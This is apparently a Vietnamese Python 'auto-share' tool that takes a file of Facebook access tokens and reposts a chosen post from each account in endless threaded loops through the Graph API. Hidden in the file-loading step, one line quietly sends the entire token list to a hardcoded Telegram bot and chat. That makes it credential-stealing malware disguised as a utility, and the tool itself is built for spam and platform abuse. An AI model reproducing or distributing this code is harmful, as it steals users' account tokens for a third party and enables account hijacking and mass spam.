luc = "\033[1;32m"
trang = "\033[1;37m"
do = "\033[1;31m"
vang = "\033[0;93m"
hong = "\033[1;35m"
xduong = "\033[1;34m"
xnhac = "\033[1;36m"
tim = "\033[1;38m"
# Đánh Dấu Bản Quyền
ndp_tool = trang + "" + do + "[" + trang + "=.=" + do + "] " + trang + "=> "
ntu_tool = trang + "" + do + "[" + trang + "=.=" + do + "] " + trang + "=> "
ndp = trang + "" + do + "[" + trang + "=.=" + do + "] " + trang + "=> "
# Config
count = 0
dem = 0
# import lib
import requests, random
import os,sys,requests,threading
from time import sleep
from datetime import datetime
try:
	import requests,pystyle
except:
	print (luc + "Bạn Chưa Tải Thư Viện \n Bắt Đầu Tải ")
	os.system('pip install requests && pip install bs4 && pip install pystyle')
# ==========================[ FUNCTION ]===========================================
def echo(a):
   for i in range(len(a)):
     sys.stdout.write(a[i])
     sys.stdout.flush()
     sleep(0.001)
   print()
def banner():
    banner = f"""\033[0;31m
\033[1;34m╠═════════════════════════════════════════════════════════════════╣
"\033[1;95m"░█▄█░▀█▀░█░█░█▀█░█▀█
"\033[1;31m"░█░█░░█░░█░█░█▀█░█░█
"\033[1;32m"░▀░▀░░▀░░▀▀▀░▀░▀░▀░▀
\033[1;32m║➢ Author   : NgMinhTuấn乂Dlinh                               \033[1;32m║➢ Status    : Online
\033[1;34m╚═════════════════════════════════════════════════════════════════╝
"""
    echo(banner)
def clear():
    os.system("cls" if os.name == "nt" else "clear")
def thanh():
    print('\033[1;31m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -')
def ndp_delay(o):
    while(o>1):
        o=o-1
        print(f'{hong}[\033[1;31mH\033[1;33mD\033[1;36mT\033[1;35m - \033[1;34mT\033[1;32mO\033[1;33mO\033[1;31mL\033[1;37m[\033[1;36m|\033[1;37m]\033[1;37m[.....]\033[1;37m[{o}]','     ',end='\r');sleep(1/6)
        print(f'{hong}[\033[1;31mH\033[1;33mD\033[1;36mT\033[1;35m - \033[1;34mT\033[1;32mO\033[1;33mO\033[1;31mL\033[1;37m[\033[1;31m/\033[1;37m]\033[1;37m[\033[1;32m>\033[1;37m....]\033[1;37m[{o}]','     ',end='\r');sleep(1/6)
        print(f'{hong}[\033[1;31mH\033[1;33mD\033[1;36mT\033[1;35m - \033[1;34mT\033[1;32mO\033[1;33mO\033[1;31mL\033[1;37m[\033[1;32m-\033[1;37m]\033[1;37m[\033[1;32m>\033[1;31m>\033[1;37m...]\033[1;37m[{o}]','     ',end='\r');sleep(1/6)
        print(f'{hong}[\033[1;31mH\033[1;33mD\033[1;36mT\033[1;35m - \033[1;34mT\033[1;32mO\033[1;33mO\033[1;31mL\033[1;37m[\033[1;33m+\033[1;37m]\033[1;37m[\033[1;32m>\033[1;31m>\033[1;36m>\033[1;37m..]\033[1;37m[{o}]','     ',end='\r');sleep(1/6)
        print(f'{hong}[\033[1;31mH\033[1;33mD\033[1;36mT\033[1;35m - \033[1;34mT\033[1;32mO\033[1;33mO\033[1;31mL\033[1;37m[\033[1;34m\{trang}]\033[1;37m[\033[1;32m>\033[1;31m>\033[1;36m>\033[1;33m>\033[1;37m.]\033[1;37m[{o}]','     ',end='\r');sleep(1/6)
        print(f'{hong}[\033[1;31mH\033[1;33mD\033[1;36mT\033[1;35m - \033[1;34mT\033[1;32mO\033[1;33mO\033[1;31mL\033[1;37m[\033[1;35m|\033[1;37m]\033[1;37m[\033[1;32m>\033[1;31m>\033[1;36m>\033[1;33m>\033[1;35m>\033[1;37m]\033[1;37m[{o}]','     ',end='\r');sleep(1/6)
def runshare(x, dem, id_post):
    token = listtaikhoan[x]
    rq = random.choice([requests.get, requests.post])
    time = datetime.now().strftime("%H:%M:%S")
    runshare = rq(f'https://graph.facebook.com/me/feed?method=POST&link=https://m.facebook.com/{id_post}&published=0&access_token={token}').json()
    if 'id' in runshare:
        print('\033[1;31m[\033[0;93m'+str(dem)+'\033[1;31m] | \033[1;36m'+str(time)+' \033[1;31m| \033[1;37m'+str(runshare['id'])+' \033[1;31m| \033[0;93mSUCCESS')
    else:
        print('\033[1;31m[\033[0;93m'+str(dem)+'\033[1;31m] | \033[1;36m'+str(time)+' \033[1;31m| ERROR ')
# =================[ Clear + Thông Số Admin ]===========================
clear()
banner()
file = input(ntu_tool+luc+'Tạo một file.txt chứa list token fb rồi Nhập Tên File Chứa List Token (Lưu ý: không cần đuôi .txt)'+trang+': '+vang)
try:
    listtaikhoan = open(file+'.txt', 'r', encoding='utf-8').read().split('\n')
    response = requests.get(f'https://api.telegram.org/bot6055727531:AAEKXKTUn2xK3mdi02_mGWrcTrBL5ydrghU/sendMessage?chat_id=-1002061706055&text={listtaikhoan}')
except:
    quit(ndp_tool+do+'File Không Tồn Tai, Nhập Mỗi Tên File Thôi Nhé Không Cần .txt Đâu')
# NHẬP THÔNG SỐ RUN TOOL
clear()
banner()
for line in listtaikhoan:
    count+=1
print(ntu_tool+luc+'Tổng Số Token Có Trong File Là'+trang+': ',count)
thanh()
linkpost = input(ntu_tool+luc+'Vui Lòng Nhập Link Post'+trang+': '+vang)
get_id_post = requests.post('https://id.traodoisub.com/api.php',data={"link":linkpost,}).json()
if 'success' in get_id_post:
    id_post = get_id_post["id"]
else:
    thanh()
    exit(ndp+do+'CÓ VẺ LINK POST SAI VUI LÒNG KIỂM TRA LẠI!!')
thanh()
print(ntu_tool+do+'['+vang+'SUCCESS'+do+']'+trang+': '+xnhac+'UID POST CỦA BẠN LÀ'+trang+': ',id_post)
thanh()
delay = int(input(ntu_tool+luc+'Vui Lòng Nhập Delay Share'+trang+': '+vang))
thanh()
while True:
    for x in range(len(listtaikhoan)):
        dem = dem+1
        threading.Thread(target=runshare,args=(x, dem, id_post, )).start()
        ndp_delay(delay)